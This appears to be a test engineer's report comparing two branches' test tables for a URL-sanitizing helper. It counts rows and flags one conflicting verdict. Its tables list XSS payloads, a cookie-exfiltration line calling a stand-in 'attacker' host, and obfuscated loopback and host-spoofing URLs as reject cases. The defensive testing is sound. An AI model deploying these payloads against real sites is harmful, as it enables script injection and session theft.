# safe-url test tables — INDEPENDENT CONTROL enumeration

**Author:** test-engineer (control leg)
**Date:** 2026-07-29
**Isolation statement:** This enumeration was produced without reading
`safeurl-union-table.md`, without messaging `dev-safeurl-union`, and without opening
either implementation blob (`web/src/util/safe-url.ts` @ `659ef58`, `d85bb5b`). Tests
and test data only.

## Provenance

Cloned from the local path `/workspace/farmtable` (never the network remote) into
`/tmp/ctl-farmtable`. Blob identities verified before reading:

| Side | Rev | Path | Blob resolved | Expected |
|---|---|---|---|---|
| MAIN | `439b309` | `web/src/util/safe-url.test.ts` | `c3e1b5cb88a7305e…` | `c3e1b5c` ✓ |
| BRANCH | `633f8f2` | `web/src/util/safe-url.test.ts` | `a9e49ff70b435c75…` | `a9e49ff` ✓ |
| MAIN | `439b309` | `testdata/url-scheme-cases.json` | `4a543288d9b161c3…` | (discovered) |

`testdata/url-scheme-cases.json` **does not exist at `633f8f2`** (`git rev-parse` exit
128, path not in tree). It is a MAIN-side artefact only.

## Counting rule applied

One row = one asserted `(input, expected verdict)` pair. Table-driven loops are
expanded: a 42-case fixture is 42 rows. Duplicate assertions of the same input count
as separate ROWS but a single DISTINCT INPUT. `null` and `undefined` are counted as
inputs (written `<null>` / `<undefined>`).

**Excluded as not being (input, verdict) pairs** — recorded here so the exclusion is
auditable, not silent:

- MAIN L167 `SAFE_SCHEMES.size > 0` — anti-vacuity guard on a set, no input.
- MAIN L169–183 — loop asserting `new URL(scheme + '//')` throws. Asserts a property
  of the WHATWG parser, not a verdict of the SUT.
- MAIN L188–203 — positive controls on `new URL('javascript://')`. Parser, not SUT.
- MAIN L209–223 — 5 rows asserting `new URL(input).hostname !== ''` for
  `javascript`/`data`/`vbscript`/`blob`/`mailto` authority forms. Parser property.
- MAIN L299–304, L380–385 — anti-vacuity counters (`divergent > 0`, `marked > 0`).
- MAIN L329–376 — base-dependence markers; asserts a JSDOM-resolved host equality,
  not an accept/reject verdict. (Iterates the same 42 fixtures.)
- MAIN L595–617 — source-text grep for `target="_blank"` / `rel="noopener"`.
- BRANCH L59–63 — `LOCAL_HTTP_LINKS_ENABLED === false`. A config pin, no input.

---

## ⚠ STRUCTURAL FINDING — the two sides do not test the same function

Reported first because it conditions every count below. **Not adjudicated.**

| | MAIN `c3e1b5c` | BRANCH `a9e49ff` |
|---|---|---|
| Import (L13 / L1) | `{ SAFE_SCHEMES, safeHref }` | `{ LOCAL_HTTP_LINKS_ENABLED, safeExternalUrl }` |
| Function under test | `safeHref` | `safeExternalUrl` |
| Reject sentinel | `=== undefined` | `=== null` |
| Accept contract | returns input **unchanged** (L134) | returns a **normalized** string (L84–98) |
| Harness | `assert` from `./assertions.js` + JSDOM + lit | local `assertEqual`, no DOM |

These are different exported symbols with different reject sentinels and different
accept contracts. A "union" of the two tables is only meaningful if these two symbols
are the same policy surface under a rename. I did not open the implementations, so I
cannot and do not rule on that. Flagging it as the precondition to check.

---

## MAIN side (`439b309`, blob `c3e1b5c`) — rows

### Tier A — inline `safeHref` table (36 rows, 35 distinct inputs)

`testRejectsUnsafeSchemes` L52–121, `testAcceptsHTTPAndHTTPS` L123–138.
`XSS` is the const defined at L43.

| # | Line | Input | Verdict | Attack class |
|---|---|---|---|---|
| 1 | 54 | `javascript:alert(1)` | reject | script scheme |
| 2 | 55 | `javascript:fetch('//attacker/'+document.cookie)` | reject | script scheme / cookie exfiltration |
| 3 | 56 | `JaVaScRiPt:alert(1)` | reject | case folding evasion |
| 4 | 57 | `JAVASCRIPT:alert(1)` | reject | case folding evasion |
| 5 | 58 | `\tjavascript:alert(1)` | reject | leading control char |
| 6 | 59 | `\njavascript:alert(1)` | reject | leading control char |
| 7 | 60 | `« »javascript:alert(1)` (one leading space) | reject | leading whitespace |
| 8 | 61 | `java\tscript:alert(1)` | reject | embedded control char |
| 9 | 62 | `java\nscript:alert(1)` | reject | embedded control char |
| 10 | 63 | `java\rscript:alert(1)` | reject | embedded control char |
| 11 | 64 | `data:text/html,<script>alert(1)</script>` | reject | data: HTML |
| 12 | 65 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | reject | data: base64 |
| 13 | 66 | `vbscript:msgbox(1)` | reject | script scheme |
| 14 | 67 | `blob:https://example.com/uuid` | reject | blob scheme |
| 15 | 68 | `file:///etc/passwd` | reject | local file access |
| 16 | 71 | `mailto:a@b.com` | reject | non-allow-listed scheme (deliberate) |
| 17 | 75 | `//evil.com/x` | reject | protocol-relative |
| 18 | 76 | `/relative/path` | reject | relative reference |
| 19 | 77 | `not-a-url` | reject | unparseable |
| 20 | 78 | `http://` | reject | missing host |
| 21 | 79 | `` (empty) | reject | empty input |
| 22 | 96 | `ftp://evil.com/x` | reject | non-allow-listed special scheme |
| 23 | 97 | `ws://evil.com/x` | reject | non-allow-listed special scheme |
| 24 | 98 | `wss://evil.com/x` | reject | non-allow-listed special scheme |
| 25 | 101 | `httpx://evil.com/x` | reject | prefix-vs-membership (`startsWith('http')`) |
| 26 | 108 | `javascript://evil.com/%0aalert(1)` | reject | script scheme in authority form |
| 27 | 109 | `data://evil.com/x` | reject | data: in authority form |
| 28 | 119 | `<undefined>` | reject | nullish input |
| 29 | 120 | `<null>` | reject | nullish input |
| 30 | 125 | `https://github.com/o/r/pull/1` | **accept** (identity) | happy path |
| 31 | 126 | `http://example.com/x` | **accept** (identity) | happy path, plaintext http |
| 32 | 127 | `HtTpS://example.com` | **accept** (identity) | scheme case folding, accepted |
| 33 | 128 | `https://example.com:8443/x` | **accept** (identity) | non-default port |
| 34 | 129 | `https://example.com/x?a=1&b=2#frag` | **accept** (identity) | query + fragment |
| 35 | 130 | `https://user:pass@example.com/x` | **accept** (identity) | **embedded credentials, accepted** |
| 36 | 228 | `javascript://evil.com/%0aalert(1)` | reject | re-assertion of row 26 (duplicate input) |

### Tier B — shared fixture `client` column (42 rows, 42 distinct inputs)

`testSharedFixturesMatchClientColumn` L275–305 loops
`testdata/url-scheme-cases.json` and asserts the `client` column against `safeHref`.
The `server` column is asserted by the Go half and is shown for context only.

| # | Input | client (= verdict under test) | server | Attack class |
|---|---|---|---|---|
| 1 | `javascript:alert(1)` | reject | reject | script scheme |
| 2 | `JaVaScRiPt:alert(1)` | reject | reject | case folding |
| 3 | `java\tscript:alert(1)` | reject | reject | embedded control char |
| 4 | `java\nscript:alert(1)` | reject | reject | embedded control char |
| 5 | `java\rscript:alert(1)` | reject | reject | embedded control char |
| 6 | `\tjavascript:alert(1)` | reject | reject | leading control char |
| 7 | `\njavascript:alert(1)` | reject | reject | leading control char |
| 8 | `« »javascript:alert(1)` | reject | reject | leading whitespace |
| 9 | `javascript:alert(1)` (DEL) | reject | reject | embedded DEL |
| 10 | `data:text/html,<script>alert(1)</script>` | reject | reject | data: HTML |
| 11 | `vbscript:msgbox(1)` | reject | reject | script scheme |
| 12 | `blob:https://example.com/uuid` | reject | reject | blob scheme |
| 13 | `file:///etc/passwd` | reject | reject | local file |
| 14 | `mailto:a@b.com` | reject | reject | non-allow-listed |
| 15 | `ftp://evil.com/x` | reject | reject | non-allow-listed |
| 16 | `ws://evil.com/x` | reject | reject | non-allow-listed |
| 17 | `wss://evil.com/x` | reject | reject | non-allow-listed |
| 18 | `httpx://evil.com/x` | reject | reject | prefix-vs-membership |
| 19 | `//evil.com/x` | reject | reject | protocol-relative |
| 20 | `/relative/path` | reject | reject | relative reference |
| 21 | `not-a-url` | reject | reject | unparseable |
| 22 | `` (empty) | reject | **accept** | empty input (server/client divergence) |
| 23 | `http://` | reject | reject | missing host |
| 24 | `http:/\/\evil.com` | **accept** | reject | **backslash host confusion (divergence)** |
| 25 | `http:/example.com` | **accept** | reject | single-slash host (divergence) |
| 26 | `http:example.com` | **accept** | reject | opaque, no slash (divergence) |
| 27 | `https://github.com/o/r/pull/1` | accept | accept | happy path |
| 28 | `http://example.com/x` | accept | accept | plaintext http |
| 29 | `HtTpS://example.com` | accept | accept | scheme case folding |
| 30 | `https://user:pass@example.com/x` | accept | accept | embedded credentials, accepted |
| 31 | `https://example.com:8443/x` | accept | accept | non-default port |
| 32 | `https://example.com/x?a=1&b=2#frag` | accept | accept | query + fragment |
| 33 | `https://EXAMPLE.com/X` | accept | accept | host/path case |
| 34 | `http://[::1]/x` | **accept** | accept | **IPv6 loopback, accepted** |
| 35 | `http://[::1/x` | reject | reject | malformed IPv6 |
| 36 | `http://example.com/a b` | **accept** | reject | bare space in path (divergence) |
| 37 | `http://exa mple.com` | reject | reject | bare space in host |
| 38 | `https://example.com/x\n` | **accept** | reject | trailing newline (divergence) |
| 39 | `http://例え.jp/x` | accept | accept | IDN host |
| 40 | `http://example.com/%zz` | **accept** | reject | bad percent escape (divergence) |
| 41 | `https://example.com:99999/x` | reject | **accept** | out-of-range port (divergence) |
| 42 | `https:///x` | **accept** | reject | empty host with path (divergence) |

Recorded server/client divergences: **9** (cases 22, 24, 25, 26, 36, 38, 40, 41, 42) —
consistent with the "9 of these 42" claim in the docblock at L268.

### Tier C — render-layer rows (8 rows, addendum)

`testPayloadNeverReachesHrefAttribute` L446–514 and `testGuardHoldsForEveryItemInAList`
L534–587 assert verdicts through the real lit components rather than against
`safeHref` directly. Kept out of the headline count because the SUT is the render path,
not the URL helper; listed so the count is reconstructable either way.

| # | Line | Input | Verdict | Site |
|---|---|---|---|---|
| C1 | 464/478 | `XSS` | reject (no `<a>`, no `[href]`) | `renderPrLink` |
| C2 | 465/506 | `https://github.com/o/r/pull/1` | accept | `renderPrLink` positive control |
| C3 | 470/478 | `XSS` | reject | `renderExternalSourceLink` |
| C4 | 471/506 | `https://example.com/x` | accept | `renderExternalSourceLink` control |
| C5 | 543/561 | `XSS` (poisoned first) | reject | `<ft-inspector-code>` list |
| C6 | 543/561 | `https://github.com/acme/widgets/pull/2` | accept | list, poisoned first |
| C7 | 544/561 | `XSS` (poisoned second) | reject | `<ft-inspector-code>` list |
| C8 | 544/561 | `https://github.com/acme/widgets/pull/2` | accept | list, poisoned second |

Tier C introduces 2 inputs not present in Tiers A+B: `https://example.com/x` and
`https://github.com/acme/widgets/pull/2`.

### MAIN COUNT

- **Tier A + Tier B = 78 rows** ← headline MAIN count
- Distinct inputs across A+B: **49**
- Including Tier C: 86 rows, 51 distinct inputs

---

## BRANCH side (`633f8f2`, blob `a9e49ff`) — rows

All 45 rows are in the single function `run()` L13–106. Reject sentinel is `null`.

| # | Line | Input | Verdict | Attack class |
|---|---|---|---|---|
| 1 | 15 | `javascript:alert(1)` | reject | script scheme |
| 2 | 16 | `JavaScript:alert(1)` | reject | case folding |
| 3 | 17 | `JAVASCRIPT:alert(1)` | reject | case folding |
| 4 | 18 | `\tjavascript:alert(1)` | reject | leading control char |
| 5 | 19 | `\njavascript:alert(1)` | reject | leading control char |
| 6 | 20 | `« »« »javascript:alert(1)« »« »` (2 spaces each side) | reject | whitespace padding |
| 7 | 21 | `java\tscript:alert(1)` | reject | embedded control char |
| 8 | 22 | `data:text/html,<script>alert(1)</script>` | reject | data: HTML |
| 9 | 23 | `vbscript:msgbox(1)` | reject | script scheme |
| 10 | 24 | `file:///etc/passwd` | reject | local file |
| 11 | 25 | `blob:https://example.com/abc` | reject | blob scheme |
| 12 | 26 | `ftp://example.com/x` | reject | non-allow-listed scheme |
| 13 | 29 | `` (empty) | reject | empty input |
| 14 | 30 | `« »« »« »` (3 spaces) | reject | whitespace-only |
| 15 | 31 | `<null>` | reject | nullish |
| 16 | 32 | `<undefined>` | reject | nullish |
| 17 | 33 | `not a url` | reject | unparseable |
| 18 | 34 | `/relative/path` | reject | relative reference |
| 19 | 35 | `//example.com/x` | reject | protocol-relative |
| 20 | 36 | `https://` | reject | missing host |
| 21 | 39 | `http://example.com/issues/1` | **reject** | **plaintext http off-loopback** |
| 22 | 40 | `http://localhost.evil.example/x` | reject | loopback-prefix host spoof |
| 23 | 41 | `http://evil.example/?q=localhost` | reject | loopback token in query |
| 24 | 42 | `http://localhost@evil.example/` | reject | loopback in userinfo |
| 25 | 43 | `http://evil.example\@localhost/` | reject | backslash userinfo trick |
| 26 | 44 | `http://localhost。evil.example/` (U+3002) | reject | ideographic-dot host spoof |
| 27 | 49 | `https://user:pass@evil.example/` | **reject** | **embedded credentials** |
| 28 | 50 | `https://ok.example@evil.example/` | reject | userinfo destination confusion |
| 29 | 51 | `https://github.com@evil.example/` | reject | lookalike userinfo |
| 30 | 52 | `https://:pass@evil.example/` | reject | password-only userinfo |
| 31 | 53 | `http://user:pass@localhost/` | reject | loopback + credentials |
| 32 | 65 | `http://localhost:8080/tasks/1` | reject | loopback http in production |
| 33 | 66 | `http://127.0.0.1:3000/tasks/1` | reject | loopback http in production |
| 34 | 70 | `http://0x7f000001/x` | reject | hex-encoded loopback |
| 35 | 71 | `http://2130706433/x` | reject | decimal-encoded loopback |
| 36 | 72 | `http://127.1/x` | reject | short-form loopback |
| 37 | 73 | `http://0177.0.0.1/x` | reject | octal-encoded loopback |
| 38 | 74 | `http://127．0．0．1/x` (U+FF0E) | reject | fullwidth-dot loopback |
| 39 | 75 | `http://0x7f000001:9200/api` | reject | hex loopback with port |
| 40 | 76 | `http://[::1]/x` | **reject** | **IPv6 loopback** |
| 41 | 79 | `https://github.com/acme/repo/issues/12` | accept → identity | happy path |
| 42 | 84 | `HTTPS://github.com/acme/repo` | accept → `https://github.com/acme/repo` | scheme case normalization |
| 43 | 89 | `« »« »https://github.com/acme/repo« »« »` | accept → `https://github.com/acme/repo` | whitespace trimmed then accepted |
| 44 | 94 | `https://example.com` | accept → `https://example.com/` | trailing-slash normalization |
| 45 | 99 | `https://localhost:8443/x` | accept → identity | **https on localhost, accepted** |

### BRANCH COUNT

- **45 rows**, **45 distinct inputs** (no input is asserted twice)

---

## Cross-side totals

| Quantity | Value |
|---|---|
| MAIN rows (Tier A + B) | **78** |
| BRANCH rows | **45** |
| MAIN distinct inputs | 49 |
| BRANCH distinct inputs | 45 |
| **DISTINCT INPUTS ACROSS BOTH SIDES** | **81** |
| Inputs asserted by both sides | 13 |
| Inputs asserted by exactly one side | 68 (36 MAIN-only + 32 BRANCH-only) |

(With Tier C folded in: MAIN 86 rows / 51 distinct, union 83 distinct, 38 MAIN-only.)

---

## ⚠ OPPOSITE VERDICTS FOR THE SAME INPUT — the finding

Exactly **one** input string is asserted by both sides with opposing verdicts.
**Reported, not adjudicated.**

### `http://[::1]/x`

**MAIN — accept.** `testdata/url-scheme-cases.json` fixture #34 (blob `4a54328`),
consumed by `testSharedFixturesMatchClientColumn` at `safe-url.test.ts` L280–291:

```
  { "name": "ipv6 host", "input": "http://[::1]/x",
    "server": "accept", "client": "accept" }
```

```
L285:    const got = safeHref(c.input) === undefined ? 'reject' : 'accept';
L286:    assert(
L287:      got === c.client,
```

With `c.client === "accept"`, this asserts `safeHref('http://[::1]/x') !== undefined`.

**BRANCH — reject.** `safe-url.test.ts` L76:

```
L76:  assertRejected('http://[::1]/x', 'IPv6 loopback is rejected');
```

which via L9–11 asserts `safeExternalUrl('http://[::1]/x') === null`.

One side pins this input as accepted, the other pins it as rejected. Both tests are
presumably green against their own implementation. No adjudication offered.

### Class-level contradictions on non-identical strings

Not exact-input collisions, so excluded from the count above, but the two tables encode
directly opposed *policies*. Flagged because a naive union keyed on exact strings will
silently merge these into a self-contradictory table:

| Policy | MAIN | BRANCH |
|---|---|---|
| Plaintext `http:` to a public host | **accept** — `http://example.com/x` (L126, fixture #28) | **reject** — `http://example.com/issues/1` (L39) |
| `https:` with embedded credentials | **accept** — `https://user:pass@example.com/x` (L130, fixture #30) | **reject** — `https://user:pass@evil.example/` (L49) |
| Loopback `http:` | accepts `http://[::1]/x`; no other loopback fixture | rejects 9 loopback forms incl. obfuscated encodings |
| Whitespace-padded valid URL | not asserted | **accept after trimming** (L89) |
| Accept semantics | returns input **unchanged** (L134) | returns **normalized** value (L84–98) |

The last row is the one most likely to break a mechanical union: MAIN's accept
assertion (`safeHref(input) === input`) and BRANCH's (`safeExternalUrl(input) ===
normalized`) are not the same predicate, so an "accept" verdict does not mean the same
thing on the two sides.

---

## MAIN ONLY — inputs asserted by MAIN and not by BRANCH (36)

| # | Input | MAIN verdict |
|---|---|---|
| 1 | `« »javascript:alert(1)` (single leading space) | reject |
| 2 | `//evil.com/x` | reject |
| 3 | `HtTpS://example.com` | accept |
| 4 | `JaVaScRiPt:alert(1)` | reject |
| 5 | `blob:https://example.com/uuid` | reject |
| 6 | `data://evil.com/x` | reject |
| 7 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | reject |
| 8 | `ftp://evil.com/x` | reject |
| 9 | `http://` | reject |
| 10 | `http://[::1/x` | reject |
| 11 | `http://exa mple.com` | reject |
| 12 | `http://example.com/%zz` | accept |
| 13 | `http://example.com/a b` | accept |
| 14 | `http://example.com/x` | accept |
| 15 | `http://例え.jp/x` | accept |
| 16 | `http:/\/\evil.com` | accept |
| 17 | `http:/example.com` | accept |
| 18 | `http:example.com` | accept |
| 19 | `https:///x` | accept |
| 20 | `https://EXAMPLE.com/X` | accept |
| 21 | `https://example.com/x\n` | accept |
| 22 | `https://example.com/x?a=1&b=2#frag` | accept |
| 23 | `https://example.com:8443/x` | accept |
| 24 | `https://example.com:99999/x` | reject |
| 25 | `https://github.com/o/r/pull/1` | accept |
| 26 | `https://user:pass@example.com/x` | accept |
| 27 | `httpx://evil.com/x` | reject |
| 28 | `java\nscript:alert(1)` | reject |
| 29 | `java\rscript:alert(1)` | reject |
| 30 | `javascript:alert(1)` (DEL) | reject |
| 31 | `javascript://evil.com/%0aalert(1)` | reject |
| 32 | `javascript:fetch('//attacker/'+document.cookie)` | reject |
| 33 | `mailto:a@b.com` | reject |
| 34 | `not-a-url` | reject |
| 35 | `ws://evil.com/x` | reject |
| 36 | `wss://evil.com/x` | reject |

(Plus, if Tier C counted: `https://example.com/x` accept,
`https://github.com/acme/widgets/pull/2` accept → 38.)

## BRANCH ONLY — inputs asserted by BRANCH and not by MAIN (32)

| # | Input | BRANCH verdict |
|---|---|---|
| 1 | `« »« »« »` (whitespace only) | reject |
| 2 | `« »« »https://github.com/acme/repo« »« »` | accept (trimmed) |
| 3 | `« »« »javascript:alert(1)« »« »` | reject |
| 4 | `//example.com/x` | reject |
| 5 | `HTTPS://github.com/acme/repo` | accept (normalized) |
| 6 | `JavaScript:alert(1)` | reject |
| 7 | `blob:https://example.com/abc` | reject |
| 8 | `ftp://example.com/x` | reject |
| 9 | `http://0177.0.0.1/x` | reject |
| 10 | `http://0x7f000001/x` | reject |
| 11 | `http://0x7f000001:9200/api` | reject |
| 12 | `http://127.0.0.1:3000/tasks/1` | reject |
| 13 | `http://127.1/x` | reject |
| 14 | `http://127．0．0．1/x` (U+FF0E) | reject |
| 15 | `http://2130706433/x` | reject |
| 16 | `http://evil.example/?q=localhost` | reject |
| 17 | `http://evil.example\@localhost/` | reject |
| 18 | `http://example.com/issues/1` | reject |
| 19 | `http://localhost.evil.example/x` | reject |
| 20 | `http://localhost:8080/tasks/1` | reject |
| 21 | `http://localhost@evil.example/` | reject |
| 22 | `http://localhost。evil.example/` (U+3002) | reject |
| 23 | `http://user:pass@localhost/` | reject |
| 24 | `https://` | reject |
| 25 | `https://:pass@evil.example/` | reject |
| 26 | `https://example.com` | accept (→ trailing slash) |
| 27 | `https://github.com/acme/repo/issues/12` | accept |
| 28 | `https://github.com@evil.example/` | reject |
| 29 | `https://localhost:8443/x` | accept |
| 30 | `https://ok.example@evil.example/` | reject |
| 31 | `https://user:pass@evil.example/` | reject |
| 32 | `not a url` | reject |

## SHARED — asserted by both sides (13)

12 agree, 1 conflicts.

| Input | MAIN | BRANCH | Agree? |
|---|---|---|---|
| `` (empty) | reject | reject | ✓ |
| `\tjavascript:alert(1)` | reject | reject | ✓ |
| `\njavascript:alert(1)` | reject | reject | ✓ |
| `/relative/path` | reject | reject | ✓ |
| `<null>` | reject | reject | ✓ |
| `<undefined>` | reject | reject | ✓ |
| `JAVASCRIPT:alert(1)` | reject | reject | ✓ |
| `data:text/html,<script>alert(1)</script>` | reject | reject | ✓ |
| `file:///etc/passwd` | reject | reject | ✓ |
| `java\tscript:alert(1)` | reject | reject | ✓ |
| `javascript:alert(1)` | reject | reject | ✓ |
| `vbscript:msgbox(1)` | reject | reject | ✓ |
| **`http://[::1]/x`** | **accept** | **reject** | **✗ CONFLICT** |

---

## Reproduction

```bash
git clone /workspace/farmtable /tmp/ctl-farmtable
cd /tmp/ctl-farmtable
git rev-parse "439b309:web/src/util/safe-url.test.ts"      # -> c3e1b5cb88a7305e...
git rev-parse "633f8f2:web/src/util/safe-url.test.ts"       # -> a9e49ff70b435c75...
git rev-parse "439b309:testdata/url-scheme-cases.json"      # -> 4a543288d9b161c3...
git rev-parse "633f8f2:testdata/url-scheme-cases.json"      # -> exit 128, absent
git cat-file blob c3e1b5cb88a7305eaad9c978b48c8c95a46b4e86  # 631 lines
git cat-file blob a9e49ff70b435c7504ed08946baa3c0f6484b1f2  # 108 lines
```

Braced `"${rev}:${path}"` form used throughout; every `git rev-parse` was echoed with
`arg=[...]` before use and no measurement had stderr suppressed (the exit-128 for the
absent fixture surfaced through stderr, which is how its absence was detected).

## Recommendations (for the manager to route; not acted on here)

1. **Resolve `http://[::1]/x` before any union is merged.** Two green suites currently
   pin opposite verdicts for it.
2. **Confirm `safeHref` and `safeExternalUrl` are the same policy surface** before
   unioning. If they are two different helpers with different contracts, the union is
   ill-posed and the three class-level contradictions above are not conflicts at all.
3. The accept-verdict predicates differ (identity vs normalized). A union table needs
   an explicit `expected_output` column, not just accept/reject.
4. MAIN's fixture `client` column accepts 6 inputs the server rejects, including
   `http:/\/\evil.com` and `https:///x`. Out of scope for this leg — noting only that
   they are recorded expectations, not incidental.
